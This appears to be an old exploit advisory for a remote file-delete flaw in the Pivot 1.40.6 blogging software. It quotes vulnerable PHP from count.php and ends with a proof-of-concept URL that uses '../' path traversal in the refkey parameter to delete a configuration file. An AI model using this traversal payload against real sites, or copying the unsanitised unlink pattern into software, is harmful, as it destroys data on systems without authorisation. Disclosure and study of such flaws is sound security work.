@@ -1,0 +1,69 @@
+Pivot 1.40.6 Remote File Delete 
+
+Alfons Luja
+
+Vuln :
+     
+     extensions/bbclone_tools/hr_conf.php line 20
+
+       ...
+ 
+       $bbclone_debug = false;  //is never change 
+
+       ...
+ 
+=========================================================
+       
+    extensions/bbclone_tools/count.php
+
+
+      ...
+
+
+      if ( ($_GET["refkey"]!="") && file_exists("$refkeydir/".$_GET["refkey"])) {   [1]
+
+	if ($bbclone_debug==true) { echo "Refkey found..<br />"; }
+
+	// Getting the time offset between the web and file server (if there is any)
+	$offset = timediffwebfile($bbclone_debug);
+
+	if ((time() - filectime("$refkeydir/".$_GET["refkey"])) < (1000+$offset)) {   [2]
+         
+		include("do_count.php");
+		if ($bbclone_debug!=true) {
+			header("content-type:image/gif");
+			readfile("pixel.gif");
+		} else {
+			echo "Counted normally";
+		}
+		die();
+
+	} else if ($bbclone_debug==true) {
+		echo "too old!";
+	}
+
+	if ($bbclone_debug!=true) {                                                    [3]
+		unlink("$refkeydir/".$_GET["refkey"]);
+	}
+}
+
+      ...
+
+
+1] . We can put existent file 
+
+2] . Time dependences 
+     If current time - last modification time < 1000 + $offset (usually 1001,1002 not more)
+     We must wait a moment other way 'exploit dosent work'  
+
+3] . $bbclone_debug is always false so if condition from point [2] == false 
+     We can delete some file 
+   
+
+If register globals is ON we can using this bug to include some file  
+
+poc :
+
+http://www.pentagon.gov/~pivot_1406_full/extensions/bbclone_tools/count.php?refkey=../../../extensions/bbclone_tools/hr_conf.php
+
+# milw0rm.com [2009-03-18]
